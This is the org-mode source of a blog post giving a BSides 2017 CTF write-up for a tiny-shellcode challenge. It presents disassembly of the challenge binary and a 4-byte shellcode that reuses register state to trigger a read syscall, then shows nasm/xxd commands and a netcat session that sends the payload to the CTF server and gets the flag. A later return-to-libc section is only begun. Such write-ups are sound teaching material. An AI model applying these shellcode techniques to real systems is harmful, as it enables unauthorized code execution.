org/_posts/2017-02-14-bsides-ctf-writeup.org
*** Direct System Call
    Beginning at =0x80487ef=, the core code runs:

    #+BEGIN_SRC nasm
  call   80486db <get_flag> ;; where the 'flag' is gotten
  add    esp,0x10
  lea    eax,[ebp-0x8c]
  mov    esi,eax
  mov    ebx,0x1
  sub    esp,0x8
  lea    eax,[ebp-0x8c]
  push   eax
  push   0x8048946
  call   8048500 <printf@plt>
  add    esp,0x10
  sub    esp,0xc
  push   0x8048964
  call   8048550 <puts@plt>
  add    esp,0x10
  sub    esp,0x4
  push   0x5
  push   DWORD PTR [ebp-0x94]
  push   0x0
  call   80484f0 <read@plt> ;; where `read` is called
  add    esp,0x10
  mov    DWORD PTR [ebp-0x90],eax
  mov    edx,0xff
  cmp    DWORD PTR [ebp-0x90],0x5
  ja     804885c <main+0x10c>
  jmp    DWORD PTR [ebp-0x94] ;; here is where it finally jumps in
    #+END_SRC

    The last line is where this =jmp= to attacker-controlled memory actually
    occurs.

    Although the above code snippet doesn't show it directly, it's also important
    to note that the address of the flag read remains stored in =ESI= when the ~jmp
    [ebp-0x94]~ occurs.

    In tandem with the fact that =read= returns the length of the value read in
    =EAX=, you can abuse this by entering a system-call. (Remember, Linux calling
    convention dictates that x86 system call's interrupt vector is given in =EAX=)

    So, in total you need to write shellcode that is only *4* bytes long (rather
    than the maximum permitted of 6), you can have the interrupt vector 'prefilled'
    for you. This leaves you with only two tasks:

    - All you need to do now is find an efficient way to copy =ESI= into =ECX= (the source register for the =read= system call)
    - Actually invoking a system call.

    There are a number of ways to do the above and due to the idiosyncracies of how
    assemblers are written and how opcodes are decoded, it's possible to write many
    different variations of an instruction that vary wildly in length. Anything
    that moves the contents of ESI into ECX will do.

    After this, you need to initiate a system call, you can use either =sysenter=
    or =int 0x80= as both are encoded in 2 bytes.

    All told, the following shellcode should do just fine.
 
    #+BEGIN_SRC nasm
  mov cx, si
  int 0x80
    #+END_SRC

    I use and recommend [[http://www.nasm.us/][Netwide Assembler]], although there are other tools like
    [[https://github.com/radare/radare2/wiki/Ragg2][Ragg2]]. To generate assembly without any sort of executable format, you can use
    the following argument switches to assemble and hexdump your shellcode:

    ~nasm -f bin assembly.asm && xxd assembly~

    After this, you can encode it in whichever format you'd like and send it off!

    #+BEGIN_EXAMPLE
 [zv@syszv] /tmp >> echo -en '\x89\xf1\xcd\x80' | \
                    nc i-am-the-shortest-6d15ba72.ctf.bsidessf.net 8890
 The address of 'flag' is 0xfff3bd5c
 Send your machine code now! Max length = 5 bytes.

 FLAG:c9f053110aa0f2d28ed8978e3b03cb01
 v7`v`v7`vyy`v`vp7x%
    #+END_EXAMPLE

*** Return-to-Libc
    This is a little trickier, you need to abuse at least two different tricks here.

   
   
